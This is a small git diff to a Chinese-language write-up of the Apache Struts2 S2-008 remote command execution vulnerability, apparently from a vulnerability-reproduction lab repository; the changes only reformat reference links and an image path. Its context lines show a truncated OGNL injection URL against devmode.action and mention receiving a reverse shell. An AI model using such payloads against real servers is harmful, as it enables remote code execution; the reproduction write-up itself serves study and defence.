@@ -6,8 +6,8 @@ S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式
 
 参考链接：
 
-- http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
-- http://struts.apache.org/docs/s2-008.html
+* http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html
+* http://struts.apache.org/docs/s2-008.html
 
 ## 漏洞影响
 
@@ -65,4 +65,4 @@ http://your-ip:8080/S2-008/devmode.action?debug=command&expression=(%23_memberAc
 
 成功接收反弹 shell：
 
-![image-20220301165140045](images/202203011651129.png)
+![image-20220301165140045](../.gitbook/assets/202203011651129.png)
